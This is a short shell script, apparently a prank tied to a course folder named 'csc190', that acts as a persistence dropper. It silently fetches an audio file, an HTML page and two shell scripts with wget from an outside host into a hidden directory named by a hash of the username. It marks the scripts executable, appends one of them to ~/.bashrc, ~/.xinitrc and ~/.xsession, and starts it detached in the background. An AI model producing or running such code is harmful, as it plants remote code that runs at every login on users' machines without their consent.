#!/bin/sh
ps -e|grep bird_launch.sh >/dev/null && exit
FOLDERNAME=$HOME/.`whoami|md5sum|cut -c 1-32`
mkdir $FOLDERNAME 2>/dev/null
cd $FOLDERNAME
test -e bird.ogg || wget --quiet http://zhuoweizhang.net/csc190/bird.ogg
test -e bird_launch.sh || wget --quiet http://zhuoweizhang.net/csc190/bird_launch.sh
test -e bird.html || wget --quiet http://zhuoweizhang.net/csc190/bird.html
test -e bird.sh || wget --quiet http://zhuoweizhang.net/csc190/bird.sh
chmod +x bird_launch.sh
chmod +x bird.sh
grep "bird.sh" ~/.bashrc >/dev/null || echo "$FOLDERNAME/bird.sh" >>~/.bashrc
grep "bird.sh" ~/.xinitrc >/dev/null 2>/dev/null|| echo "$FOLDERNAME/bird.sh" >>~/.xinitrc
grep "bird.sh" ~/.xsession >/dev/null 2>/dev/null|| echo "$FOLDERNAME/bird.sh" >>~/.xsession
nohup ./bird_launch.sh >/dev/null 2>/dev/null &
